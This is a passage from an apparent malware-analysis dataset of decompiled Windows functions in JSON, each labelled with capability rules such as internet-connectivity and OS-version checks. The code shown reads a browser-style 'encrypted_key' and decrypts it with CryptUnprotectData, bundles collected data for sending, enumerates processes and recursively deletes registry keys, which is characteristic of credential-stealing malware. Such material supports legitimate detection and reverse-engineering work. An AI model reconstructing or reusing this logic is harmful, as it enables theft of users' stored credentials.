+ iVar3;\n                        *(&stack0xfffffff4 + iVar3) = 0xc;\n                        *(&stack0xffffffec + iVar3) = 0x40ebeb;\n                        fcn.0041f9c0();\n                        uVar9 = 0xffffffff;\n                        pcVar13 = *(&stack0x0000002c + iVar3);\n                        do {\n                            if (uVar9 == 0) break;\n                            uVar9 = uVar9 - 1;\n                            cVar2 = *pcVar13;\n                            pcVar13 = pcVar13 + 1;\n                        } while (cVar2 != '\\0');\n                        *(&stack0xfffffffc + iVar3) = *(&stack0x0000002c + iVar3);\n                        *(&stack0xfffffff8 + iVar3) = pcVar1;\n                        *(&stack0xfffffff0 + iVar3) = puVar8;\n                        (&stack0x0000002c)[iVar3] = 0;\n                        *(&stack0xfffffff4 + iVar3) = ~uVar9 - 1;\n                        *(&stack0xffffffec + iVar3) = 0x40ec19;\n                        fcn.0041fa70();\n                        uVar9 = 0xffffffff;\n                        pcVar13 = pcVar1;\n                        do {\n                            if (uVar9 == 0) break;\n                            uVar9 = uVar9 - 1;\n                            cVar2 = *pcVar13;\n                            pcVar13 = pcVar13 + 1;\n                        } while ((&stack0x0000002c)[iVar3] != cVar2);\n                        *(&stack0xfffffff4 + iVar3) = pcVar1;\n                        *(&stack0xfffffff8 + iVar3) = ~uVar9;\n                        *(&stack0xfffffff0 + iVar3) = &stack0x00000100 + iVar3;\n                        *(&stack0xffffffec + iVar3) = 0x40ec3b;\n                        fcn.00412548();\n                        *(&stack0x00000004 + iVar3) = pcVar1;\n                        *(&stack0xfffffff4 + iVar3) = \"%c%s\\a%s\\a%s\\b\\b\\b\\b\";\n                        *(&stack0xfffffff0 + iVar3) = &stack0x00000044 + iVar3;\n                        *(&stack0x00000000 + iVar3) = &stack0x00000680 + iVar3;\n                        *(&stack0xfffffffc + iVar3) = *(&stack0x00000024 + iVar3);\n                        *(&stack0xfffffff8 + iVar3) = *(&stack0x00001bd0 + iVar3);\n                        *(&stack0xffffffec + iVar3) = 0x40ec6d;\n                        iVar6 = fcn.00412755();\n                        if (iVar6 != -1) {\n                            *(&stack0xfffffffc + iVar3) = iVar6;\n                            *(&stack0x00000000 + iVar3) = 1;\n                            *(&stack0xfffffff8 + iVar3) = &stack0x00000044 + iVar3;\n                            *(&stack0xfffffff4 + iVar3) = *(&stack0x00000018 + iVar3);\n                            *(&stack0xfffffff0 + iVar3) = &stack0x00000040 + iVar3;\n                            *(&stack0xffffffec + iVar3) = 0x40ec98;\n                            uVar7 = fcn.00412abf();\n                            *(&stack0x00000018 + iVar3) = *(&stack0x00000018 + iVar3) + iVar6;\n                            *(&stack0x00000040 + iVar3) = uVar7;\n                        }\n                        *(&stack0xfffffff8 + iVar3) = 0x400;\n                        *(&stack0xfffffff4 + iVar3) = 0;\n                        *(&stack0xfffffff0 + iVar3) = &stack0x00000680 + iVar3;\n                        *(&stack0xffffffec + iVar3) = 0x40ecbf;\n                        fcn.004129e4();\n                        *(&stack0xfffffff8 + iVar3) = 0x400;\n                        *(&stack0xfffffff4 + iVar3) = 0;\n                        *(&stack0xfffffff0 + iVar3) = *(&stack0x00000024 + iVar3);\n                        *(&stack0xffffffec + iVar3) = 0x40ecdb;\n                        fcn.004129e4();\n                        *(&stack0xfffffff8 + iVar3) = 0x100;\n                        *(&stack0xfffffff4 + iVar3) = 0;\n                        *(&stack0xfffffff0 + iVar3) = &stack0x00000180 + iVar3;\n                        *(&stack0xffffffec + iVar3) = 0x40ecfa;\n                        fcn.004129e4();\n                        *(&stack0xfffffff8 + iVar3) = 0x80;\n                        *(&stack0xfffffff4 + iVar3) = 0;\n                        *(&stack0xfffffff0 + iVar3) = &stack0x00000080 + iVar3;\n                        *(&stack0xffffffec + iVar3) = 0x40ed19;\n                        fcn.004129e4();\n                        *(&stack0xfffffff8 + iVar3) = 0x80;\n                        *(&stack0xfffffff4 + iVar3) = 0;\n                        *(&stack0xfffffff0 + iVar3) = &stack0x00000100 + iVar3;\n                        *(&stack0xffffffec + iVar3) = 0x40ed38;\n                        fcn.004129e4();\n                        *(&stack0xfffffff8 + iVar3) = 0x30;\n                        *(&stack0xfffffff4 + iVar3) = 0;\n                        *(&stack0xfffffff0 + iVar3) = &stack0x00000050 + iVar3;\n                        *(&stack0xffffffec + iVar3) = 0x40ed54;\n                        fcn.004129e4();\n                    }\n                }\n                if ((0xc < uVar5) && ((uVar5 & 1) != 0)) {\n                    uVar5 = uVar5 - 0xd >> 1;\n                    if (*(&stack0x00000014 + iVar3) == 1) {\n                        *(&stack0xfffffff8 + iVar3) = uVar5 + 1;\n                        *(&stack0xfffffff4 + iVar3) = *(&stack0x00000010 + iVar3);\n                        puVar8 = *(&stack0x00000024 + iVar3);\n                    }\n                    else {\n                        if (*(&stack0x00000014 + iVar3) != 3) goto code_r0x0040eda9;\n                        *(&stack0xfffffff8 + iVar3) = uVar5 + 1;\n                        *(&stack0xfffffff4 + iVar3) = *(&stack0x00000010 + iVar3);\n                        puVar8 = &stack0x00000680 + iVar3;\n                    }\n                    *(&stack0xfffffff0 + iVar3) = puVar8;\n                    *(&stack0xffffffec + iVar3) = 0x40eda9;\n                    fcn.00412548();\n                }\n            }\ncode_r0x0040eda9:\n            *(&stack0x00000010 + iVar3) = *(&stack0x00000010 + iVar3) + uVar5;\n            *(&stack0x00000014 + iVar3) = *(&stack0x00000014 + iVar3) + *(&stack0x0000003c + iVar3);\n        }\n    }\n    **(&stack0x00001bd8 + iVar3) = *(&stack0x00000018 + iVar3);\n    return *(&stack0x00000040 + iVar3);\n}\n",
        "token_count": 3680
    },
    "0040edd6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0040edd6(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uchar *puVar9;\n    int32_t iVar10;\n    ulong uVar11;\n    char *apcStack2844 [3];\n    int32_t aiStack2832 [5];\n    char *apcStack2812 [6];\n    int32_t iStack2788;\n    uchar auStack2784 [4];\n    int32_t var_ad8h;\n    int32_t var_ad4h;\n    uint32_t var_ad0h;\n    int32_t var_acch;\n    int32_t var_ac8h;\n    int32_t var_ac4h;\n    char *var_ac0h;\n    uint var_abch;\n    int32_t var_ab8h;\n    int32_t var_ab4h;\n    int32_t var_ab0h;\n    uint var_aach;\n    int32_t var_aa8h;\n    uchar *var_aa4h;\n    int32_t var_aa0h;\n    uint var_a9ch;\n    uint var_a98h;\n    uint var_a18h;\n    uint var_a13h;\n    uint var_818h;\n    uint var_ch;\n    \n    var_ac8h = 0;\n    apcStack2812[2] = 0x800;\n    apcStack2812[1] = NULL;\n    aiStack2832[4] = 0x40ee0d;\n    apcStack2812[0] = &fcn.0040edd6::var_818h;\n    fcn.004129e4();\n    apcStack2812[0] = &fcn.0040edd6::var_a18h;\n    apcStack2812[2] = 0x200;\n    apcStack2812[1] = NULL;\n    aiStack2832[4] = 0x40ee2b;\n    fcn.004129e4();\n    apcStack2812[0] = &fcn.0040edd6::var_a98h;\n    apcStack2812[2] = 0x80;\n    apcStack2812[1] = NULL;\n    aiStack2832[4] = 0x40ee49;\n    fcn.004129e4();\n    apcStack2812[2] = &fcn.0040edd6::var_ac8h;\n    apcStack2812[1] = NULL;\n    var_aa0h = 0;\n    var_a9ch = 0;\n    apcStack2812[0] = arg_ch;\n    aiStack2832[4] = 0x40ee7a;\n    var_ac4h = fcn.00408042();\n    if ((var_ac4h == 0) || (var_ac8h < 1)) {\n        return 0;\n    }\n    apcStack2812[1] = 0x4235fa;\n    apcStack2812[0] = arg_10h;\n    aiStack2832[4] = 0x40ee9d;\n    iVar4 = sub.msvcrt.dll_fopen();\n    if (iVar4 == 0) {\n        return 0;\n    }\n    apcStack2812[0] = arg_10h;\n    aiStack2832[4] = 0x40eeab;\n    apcStack2812[0] = fcn.004074c5();\n    aiStack2832[4] = 0x40eeb9;\n    var_acch = apcStack2812[0];\n    iVar5 = sub.msvcrt.dll_malloc();\n    if (iVar5 == 0) {\n        aiStack2832[4] = 0x40eecd;\n        apcStack2812[0] = iVar4;\n        sub.msvcrt.dll_fclose();\n        return 0;\n    }\n    apcStack2812[2] = var_acch;\n    apcStack2812[1] = 0x1;\n    aiStack2832[4] = 0x40eeec;\n    apcStack2812[0] = iVar5;\n    apcStack2812[3] = iVar4;\n    sub.msvcrt.dll_fread();\n    aiStack2832[4] = 0x40eef4;\n    apcStack2812[0] = iVar4;\n    sub.msvcrt.dll_fclose();\n    apcStack2812[1] = \"encrypted_key\";\n    apcStack2812[0] = 0x1;\n    aiStack2832[4] = 0x40ef0c;\n    apcStack2812[2] = iVar5;\n    apcStack2812[1] = fcn.004125de();\n    apcStack2812[4] = 0x800;\n    apcStack2812[2] = \"encrypted_key\";\n    aiStack2832[4] = 0x40ef2c;\n    apcStack2812[0] = iVar5;\n    apcStack2812[3] = &fcn.0040edd6::var_818h;\n    cVar3 = fcn.0040b50a();\n    if (cVar3 == '\\0') {\n        return 0;\n    }\n    uVar7 = 0xffffffff;\n    puVar8 = &fcn.0040edd6::var_818h;\n    do {\n        if (uVar7 == 0) break;\n        uVar7 = uVar7 - 1;\n        cVar3 = *puVar8;\n        puVar8 = puVar8 + 1;\n    } while (cVar3 != '\\0');\n    apcStack2812[2] = &fcn.0040edd6::var_a18h;\n    apcStack2812[1] = ~uVar7 - 1;\n    aiStack2832[4] = 0x40ef52;\n    apcStack2812[0] = &fcn.0040edd6::var_818h;\n    fcn.00404081();\n    aiStack2832[4] = 0x40ef63;\n    uVar11 = fcn.0041f3f0();\n    iVar5 = uVar11 >> 0x20;\n    iVar4 = -uVar11;\n    var_aa8h = iVar5;\n    var_aa4h = &stack0xfffff520 + iVar4;\n    puVar8 = &fcn.0040edd6::var_a13h;\n    puVar9 = &stack0xfffff520 + iVar4;\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    *(&stack0xfffff51c + iVar4) = &fcn.0040edd6::var_aa0h;\n    *(&stack0xfffff518 + iVar4) = 0;\n    *(&stack0xfffff514 + iVar4) = 0;\n    *(&stack0xfffff510 + iVar4) = 0;\n    *(&stack0xfffff50c + iVar4) = 0;\n    *(&stack0xfffff508 + iVar4) = 0;\n    *(&stack0xfffff504 + iVar4) = &fcn.0040edd6::var_aa8h;\n    *(&stack0xfffff500 + iVar4) = 0x40efc1;\n    iVar5 = sub.CRYPT32.DLL_CryptUnprotectData();\n    uVar2 = var_a9ch;\n    if ((iVar5 != 0) && (var_aa0h != 0)) {\n        *(&stack0xfffff4f0 + iVar4) = 0x21;\n        *(&stack0xfffff4ec + iVar4) = uVar2;\n        *(&stack0xfffff4e8 + iVar4) = &fcn.0040edd6::var_a98h;\n        *(&stack0xfffff4e4 + iVar4) = 0x40eff1;\n        fcn.00412548();\n    }\n    var_ac0h = var_ac4h + 0x10;\n    *(&stack0xfffff4e8 + iVar4) = &fcn.0040edd6::var_ac0h;\n    *(&stack0xfffff4e4 + iVar4) = 0x40f014;\n    uVar7 = fcn.0040e4f7();\n    var_ad0h = uVar7 & 0xffff;\n    cVar3 = *(var_ac4h + 100);\n    *(&stack0xfffff4ec + iVar4) = \"0x%02hhX\";\n    *(&stack0xfffff4e8 + iVar4) = &fcn.0040edd6::var_aach;\n    *(&stack0xfffff4f0 + iVar4) = cVar3;\n    *(&stack0xfffff4e4 + iVar4) = 0x40f03b;\n    sub.msvcrt.dll_sprintf();\n    *(&stack0xfffff4ec + iVar4) = \"0x0D\";\n    *(&stack0xfffff4e8 + iVar4) = &fcn.0040edd6::var_aach;\n    *(&stack0xfffff4e4 + iVar4) = 0x40f04b;\n    iVar5 = sub.msvcrt.dll_strcmp();\n    if (iVar5 != 0) {\n        *(&stack0xfffff4ec + iVar4) = \"0x05\";\n        *(&stack0xfffff4e8 + iVar4) = &fcn.0040edd6::var_aach;\n        *(&stack0xfffff4e4 + iVar4) = 0x40f05f;\n        iVar5 = sub.msvcrt.dll_strcmp();\n        if (iVar5 != 0) goto code_r0x0040f063;\n    }\n    var_abch = 0;\n    iVar10 = 0;\n    var_ab8h = 0;\n    iVar5 = 0;\n    var_ad8h = var_ac8h / var_ad0h;\n    for (var_acch = 1; var_acch < var_ad8h; var_acch = var_acch + 1) {\n        var_ac0h = var_ac4h + iVar10;\n        if (*var_ac0h == '\\r') {\n            var_ac0h = var_ac0h + 3;\n            *(&stack0xfffff4e8 + iVar4) = &fcn.0040edd6::var_ac0h;\n            *(&stack0xfffff4e4 + iVar4) = 0x40f0ed;\n            uVar7 = fcn.0040e4f7();\n            *(&stack0xfffff4e8 + iVar4) = &fcn.0040edd6::var_ac0h;\n            *(&stack0xfffff4e4 + iVar4) = 0x40f0fe;\n            uVar6 = fcn.0040e4f7();\n            var_ab4h = 0;\n            var_ac0h = (uVar6 & 0xffff) + iVar10 + var_ac4h;\n            for (uVar7 = uVar7 & 0xffff; uVar7 != 0; uVar7 = uVar7 - 1) {\n                var_ab0h = 1;\n                *(&stack0xfffff4ec + iVar4) = &fcn.0040edd6::var_ab0h;\n                *(&stack0xfffff4e8 + iVar4) = var_ac0h;\n                *(&stack0xfffff4e4 + iVar4) = 0x40f143;\n                var_ad4h = fcn.0040e4c0();\n                if (10000 < var_ad4h) break;\n                var_ac0h = var_ac0h + var_ab0h;\n                *(&stack0xfffff4ec + iVar4) = &fcn.0040edd6::var_ab0h;\n                *(&stack0xfffff4e8 + iVar4) = var_ac0h;\n                *(&stack0xfffff4e4 + iVar4) = 0x40f178;\n                fcn.0040e4c0();\n                var_ac0h = var_ac0h + var_ab0h;\n                *(&stack0xfffff4f4 + iVar4) = &fcn.0040edd6::var_a98h;\n                *(&stack0xfffff4f0 + iVar4) = &fcn.0040edd6::var_ab8h;\n                *(&stack0xfffff4ec + iVar4) = var_ac0h;\n                *(&stack0xfffff4e8 + iVar4) = arg_8h;\n                *(&stack0xfffff4e4 + iVar4) = 0x40f1ad;\n                var_ab4h = fcn.0040e9b6();\n                iVar1 = var_ab8h;\n                if (var_ab4h != 0) {\n                    *(&stack0xfffff4ec + iVar4) = iVar5;\n                    *(&stack0xfffff4f8 + iVar4) = 1;\n                    *(&stack0xfffff4f4 + iVar4) = iVar1;\n                    *(&stack0xfffff4f0 + iVar4) = &fcn.0040edd6::var_ab4h;\n                    *(&stack0xfffff4e8 + iVar4) = &fcn.0040edd6::var_abch;\n                    *(&stack0xfffff4e4 + iVar4) = 0x40f1e5;\n                    var_abch = fcn.00412abf();\n                    iVar5 = iVar5 + var_ab8h;\n                }\n                var_ac0h = var_ac0h + var_ad4h;\n            }\n        }\n        iVar10 = iVar10 + var_ad0h;\n    }\ncode_r0x0040f063:\n    *(&stack0xfffff4e8 + iVar4) = &fcn.0040edd6::var_ac4h;\n    *(&stack0xfffff4e4 + iVar4) = 0x40f071;\n    fcn.00407f59();\n    return var_abch;\n}\n",
        "token_count": 3242
    },
    "0040f873": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040f873(uint param_1, uchar param_2, uchar param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    uint uVar4;\n    char *pcStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    pcStack28 = NULL;\n    iStack24 = 0;\n    iStack20 = 0;\n    // switch table (11 cases) at 0x423d64\n    switch(param_3) {\n    case 1:\n        uVar4 = 1;\n        goto code_r0x0040f974;\n    case 2:\n        pcStack28 = fcn.0040e3b5(&iStack20);\n        goto code_r0x0040fd31;\n    case 3:\n        pcStack28 = fcn.0040f80e();\n        goto code_r0x0040f97f;\n    case 4:\n        pcStack28 = fcn.0040f281();\n        iStack24 = fcn.0040f21c();\n        break;\n    case 5:\n        pcStack28 = fcn.0040f382();\n        iStack24 = fcn.0040f31d();\n        break;\n    case 6:\n        uVar4 = 6;\ncode_r0x0040f974:\n        pcStack28 = fcn.0040b5a1(uVar4);\n        goto code_r0x0040f97f;\n    default:\n        pcStack28 = fcn.0040b5a1(6);\n        iStack24 = fcn.0040b5a1(1);\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        iStack24 = fcn.0040f41e();\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        iStack24 = fcn.0040f483();\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        iStack24 = fcn.0040f51f();\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        iStack24 = fcn.0040f584();\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        iStack24 = fcn.0040f717();\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        iStack24 = fcn.0040f772();\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        iStack24 = fcn.0040f620();\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        iStack24 = fcn.0040f67b();\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        iStack24 = fcn.0040f21c();\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        iStack24 = fcn.0040f31d();\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        iStack24 = fcn.0040f281();\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        iStack24 = fcn.0040f382();\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        iStack24 = fcn.0040f80e();\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n        }\n        if (pcStack28 != NULL) {\n            uVar2 = 0xffffffff;\n            pcVar3 = pcStack28;\n            do {\n                if (uVar2 == 0) break;\n                uVar2 = uVar2 - 1;\n                cVar1 = *pcVar3;\n                pcVar3 = pcVar3 + 1;\n            } while (cVar1 != '\\0');\n            iStack20 = ~uVar2 - 1;\n        }\n        iStack24 = fcn.0040e3b5(&iStack16);\n        if (iStack24 != 0) {\n            pcStack28 = fcn.00412abf(&pcStack28, iStack20, &iStack24, iStack16, 1);\n            iStack20 = iStack20 + iStack16;\n        }\n        goto code_r0x0040fd31;\n    case 8:\n        pcStack28 = fcn.0040f483();\n        iStack24 = fcn.0040f41e();\n        break;\n    case 9:\n        pcStack28 = fcn.0040f584();\n        iStack24 = fcn.0040f51f();\n        break;\n    case 10:\n        pcStack28 = fcn.0040f67b();\n        iStack24 = fcn.0040f620();\n        break;\n    case 0xb:\n        pcStack28 = fcn.0040f772();\n        iStack24 = fcn.0040f717();\n    }\n    if (iStack24 != 0) {\n        pcStack28 = fcn.00412abf(&pcStack28, 0xffffffff, &iStack24, 0xffffffff, 1);\n    }\ncode_r0x0040f97f:\n    if (pcStack28 != NULL) {\n        uVar2 = 0xffffffff;\n        pcVar3 = pcStack28;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        iStack20 = ~uVar2 - 1;\n    }\ncode_r0x0040fd31:\n    fcn.00407f59(&iStack24);\n    fcn.00405d7d(param_1, param_2, pcStack28, iStack20);\n    if (pcStack28 != NULL) {\n        fcn.00407f59(&pcStack28);\n    }\n    return;\n}\n",
        "token_count": 1764
    },
    "0040fdcd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040fdcd(uint param_1, uchar param_2, char param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pcStack20;\n    uint auStack16 [2];\n    \n    pcStack20 = NULL;\n    if (param_3 == '\\x01') {\n        pcStack20 = fcn.0040d115();\n    }\n    else if (param_3 == '\\x02') {\n        pcStack20 = fcn.0040b5a1(2);\n    }\n    else {\n        pcStack20 = fcn.0040b5a1(2);\n        auStack16[0] = fcn.0040d115();\n        pcStack20 = fcn.00412abf(&pcStack20, 0xffffffff, auStack16, 0xffffffff, 1);\n    }\n    iVar2 = 0;\n    if (pcStack20 != NULL) {\n        uVar3 = 0xffffffff;\n        pcVar4 = pcStack20;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        iVar2 = ~uVar3 - 1;\n    }\n    fcn.00405d7d(param_1, param_2, pcStack20, iVar2);\n    if (pcStack20 != NULL) {\n        fcn.00407f59(&pcStack20);\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "0040fe8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040fe8c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    ushort *puVar7;\n    uint32_t uVar8;\n    uint unaff_EBX;\n    ulong uVar9;\n    uint *puVar10;\n    uint uStack1488;\n    uchar auStack1484 [4];\n    int32_t iStack1480;\n    int32_t iStack1476;\n    uchar auStack1472 [4];\n    ushort *puStack1468;\n    ushort uStack1460;\n    ushort uStack1458;\n    ushort uStack1454;\n    ushort uStack1452;\n    uint16_t uStack1450;\n    uint16_t uStack1448;\n    uchar auStack1444 [8];\n    uchar auStack1436 [4];\n    uchar auStack1432 [20];\n    uchar auStack1412 [8];\n    uint uStack1404;\n    uchar auStack1376 [12];\n    uint auStack1364 [62];\n    uchar auStack1116 [556];\n    uchar auStack560 [496];\n    uint uStack64;\n    \n    uVar9 = sub.KERNEL32.dll_CreateToolhelp32Snapshot(2, 0);\n    puVar10 = uVar9 >> 0x20;\n    iVar1 = uVar9;\n    if (iVar1 != -1) {\n        puVar10 = auStack1364;\n        auStack1364[0] = 0x128;\n        iVar2 = sub.KERNEL32.dll_Process32First(iVar1, puVar10);\n        if (iVar2 != 0) {\n            fcn.0041236c(auStack1432, 0x8000);\n            uVar3 = fcn.004081aa(\"Ed5FWSQid_4idLCldjfD\");\n            uVar4 = fcn.00407f7a(\"psapi.dll\");\n            pcVar5 = fcn.00407f8e(uVar4, uVar3);\n            if (pcVar5 == NULL) {\n                uVar3 = fcn.004081aa(\"Ed5FWSQid_4idLCldjfD\");\n                uVar4 = fcn.00407f7a(0x424367);\n                pcVar5 = fcn.00407f8e(uVar4, uVar3);\n            }\n            do {\n                uVar6 = sub.KERNEL32.dll_OpenProcess(0x410, 0, auStack1364[0]);\n                if (((uVar6 == 0) || (pcVar5 == NULL)) || (iVar2 = (*pcVar5)(uVar6, 0, auStack560, 0x204),  iVar2 == 0))\n                {\n                    fcn.00412548(auStack560, 0x424374, 0x204);\n                }\n                puVar7 = &uStack1460;\n                uVar8 = uVar6;\n                puStack1468 = puVar7;\n                iVar2 = sub.KERNEL32.dll_GetProcessTimes(uVar6, puVar7, &uStack1452, &uStack1452, &uStack1452);\n                if ((iVar2 == 0) || (iStack1480 == 0)) {\n                    fcn.00412548(auStack1436, 0x424374, 0x20);\n                }\n                else {\n                    sub.KERNEL32.dll_FileTimeToSystemTime(uStack1488, &uStack1452);\n                    puVar7 = uStack1448;\n                    uVar8 = uStack1450;\n                    fcn.004127a8(auStack1444, 0x20, \"%.2d/%.2d/%d %.2d:%.2d:%.2d\", uStack1454, uStack1458, uStack1460, \n                                 uStack1452, uVar8, puVar7);\n                }\n                if (uVar6 != 0) {\n                    sub.KERNEL32.dll_CloseHandle(uVar6);\n                }\n                iVar2 = fcn.004127a8(auStack1116, 0x204, \"%s\\a%d\\a%s\\a%s\\a\", auStack1376, uStack1404, auStack560, \n                                     auStack1444, uVar8, puVar7);\n                if (0 < iVar2) {\n                    fcn.00412458(auStack1472, auStack1116, iVar2);\n                }\n                iVar2 = sub.KERNEL32.dll_Process32Next(iVar1, auStack1412);\n            } while (iVar2 != 0);\n            sub.KERNEL32.dll_CloseHandle();\n            if (iStack1476 != 0) {\n                fcn.00412540(auStack1484);\n            }\n            fcn.00405d7d(uStack64);\n            fcn.004123b1(auStack1484);\n            return;\n        }\n        sub.KERNEL32.dll_CloseHandle(iVar1);\n    }\n    fcn.00405d7d(unaff_EBX, 0xbf, 0, 0, puVar10);\n    return;\n}\n",
        "token_count": 1143
    },
    "0041086b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.0041086b(uint param_1, char *param_2, uint param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    char **ppcVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uchar *puVar10;\n    char *pcStack640;\n    uint auStack636 [3];\n    uchar auStack624 [80];\n    uchar auStack544 [528];\n    \n    if (*param_2 == '\\0') {\n        fcn.00412548(auStack544, param_3, 0x204);\n    }\n    else {\n        auStack636[0] = param_3;\n        pcStack640 = param_2;\n        fcn.004127a8(auStack544, 0x204, 0x4243a0);\n    }\n    uVar2 = sub.ADVAPI32.DLL_RegDeleteKeyA(param_1, auStack544);\n    bVar4 = true;\n    if (uVar2 != 0) {\n        puVar10 = auStack624;\n        uVar2 = sub.ADVAPI32.DLL_RegOpenKeyExA(param_1, auStack544, 0, 0x108, puVar10);\n        if (uVar2 == 0) {\n            ppcVar5 = &pcStack640;\n            pcStack640 = 0x40;\n            uVar9 = 0;\n            uVar8 = 0;\n            uVar7 = 0;\n            uVar6 = 0;\n            do {\n                iVar3 = sub.ADVAPI32.DLL_RegEnumKeyExA(puVar10, 0, auStack636, ppcVar5, uVar6, uVar7, uVar8, uVar9);\n                if (iVar3 != 0) break;\n                cVar1 = fcn.0041086b();\n            } while (cVar1 != '\\0');\n            sub.ADVAPI32.DLL_RegCloseKey();\n            uVar2 = sub.ADVAPI32.DLL_RegDeleteKeyA(param_1);\n            bVar4 = uVar2 == 0;\n        }\n        else {\n            bVar4 = uVar2 == 2;\n        }\n    }\n    return uVar2 & 0xffffff00 | bVar4;\n}\n",
        "token_count": 532
    },
    "00410ada": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n\nuint32_t fcn.00410ada(void)\n\n{\n    uchar *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint8_t uVar8;\n    int32_t *piVar9;\n    int32_t *piVar10;\n    bool bVar11;\n    uchar auStack36 [16];\n    uint uStack20;\n    \n    uStack20 = 0x410ae8;\n    iVar6 = fcn.0041f3f0();\n    iVar6 = -iVar6;\n    *(&stack0xfffffffc + iVar6) = 0x101;\n    *(&stack0xfffffff8 + iVar6) = 0;\n    uVar4 = *(&stack0x000020c8 + iVar6);\n    *(&stack0x00000040 + iVar6) = 0x1000;\n    *(&stack0x00000000 + iVar6) = &stack0x0000003c + iVar6;\n    *(&stack0xfffffff4 + iVar6) = *(&stack0x000020c4 + iVar6);\n    *(&stack0xfffffff0 + iVar6) = *(&stack0x000020c0 + iVar6);\n    *(&stack0xffffffec + iVar6) = 0x410b2b;\n    uVar7 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n    uVar8 = 0;\n    if (uVar7 == 0) {\n        